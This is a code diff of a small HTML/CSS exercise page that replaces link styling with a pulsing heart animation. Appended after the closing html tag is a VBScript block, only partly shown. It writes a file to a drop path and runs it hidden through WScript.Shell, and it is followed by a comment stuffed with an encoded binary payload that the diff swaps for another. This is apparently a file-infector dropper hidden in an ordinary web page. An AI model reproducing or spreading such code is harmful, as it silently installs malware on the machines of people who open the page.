@@ -4,25 +4,38 @@
 		<meta charset="utf-8">
 		<title></title>
 		<style type="text/css">
-			a {
-				height: 33px;
-				color: white;
-				padding-left: 15px;
-				display: inline-block;
-				text-decoration: none;
-				line-height: 33px;
-				background: url(to.png)no-repeat left;
+			img {
+				/* åŠ¨ç”»åç§° èŠ±è´¹æ—¶é—´ è¿åŠ¨æ›²çº¿ ä½•æ—¶å¼€å§‹ æ’­æ”¾æ¬¡æ•° æ˜¯å¦åæ–¹å‘ */
+				animation: heart 1s linear 0s infinite alternate;
 			}
-			span{
-				background: url(to.png)no-repeat right;
-				height: 33px;
-				padding-right: 15px;
-				display: inline-block;
+
+			div {
+				width: 100px;
+				height: 100px;
+				background-color: pink;
+				margin: 50px auto;
+				animation: heart 1s ease 0s infinite alternate;
+			}
+
+			@keyframes heart {
+				0% {
+					transform: scale(1.0);
+				}
+
+				50% {
+					transform: scale(1.3);
+				}
+
+				100% {
+					transform: scale(1.0);
+
+				}
 			}
 		</style>
 	</head>
 	<body>
-		<a href="#"><span>é¦–é¡µ</span></a>
+		<img src="images/heart.png">
+		<div></div>
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -39,6 +52,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!-- À>0™%piQûŸ#ûŸ¢¯–å"ˆæ¾ÈûßAãÚ[ÌøYdFÃeí%{wòÃımüã‡ºRøuµôpì"¬·¿›]ş–;K†M‰S‚:2i©?NŸŒ­
-â{»àŞI%Õf£y é¹Ç8©8`ğJÜ´sÑâƒÛn–ˆk¦qUí·&ƒâ°¶‘.ëWÕ¦ŒZ¶î½ƒ$zàÚ¡b*¿QÙO7¼³÷‚.±Ô6^€_nC5n‚–PË¿Ì6¾Üz›ÅÁçeİğÉ#ÓÚ"µù÷š­å @Vá©¥ã–Ø05 õáÎröÆ'(.ÆÅ–CF¡Èj?•ò sk/÷Hlï¯µF“b,
-ùDª‰ıF{øÁ¹r \9E1ô/\b‡¨©«5¦UÁZy‡’\h,1¤…£Y Ü:R!ùÜ:Ü:Ü:‘çOğ9¬_÷İ: Ü:-->
+//--></SCRIPT><!--ˆ×Š+kÜ™¹~øÀÇ²(Éâ	MŸ¤ËÖÊ\MA¿şÏØÌ®èĞH#Å>N÷€†±v¾S2ÌP;ÏŸ*Œ´Ïşé&E¦özN5Òš/Aµg ôî¬´¢ÑÈ+FgHŞ1@Í†qSEÅàuî =?ã…íMˆ…G¸,^a\R qhÅÀï4öä*-äŞ0M‹ætÑhìM×[¤î‡§üÑ²É”ÒH×?>»Öã±&A§Š×¯lèô'Ôl®}WY§öŠÌ¸FÑ…ºOašàØ®®Wâ‘¼A<ƒrãOR£¸àÂ6·ë+ZÍòV¢ò/LÍ4^OíMËAt¯[ñ¼í±tlÅŒş¥ßş‰/Ïöğğ	‹+¡7 (oO›â¢†ù|-“”¥=-ê½[LSà~âÍ·Ê*N-)—ù‚¦VĞê\÷¦]C±ÖVE²O	e†ßœ˜Q=¶¶!` Ü:R!ùÜ:Ü:Ü:‘çOi2¬_ÂŞ: Ü:-->
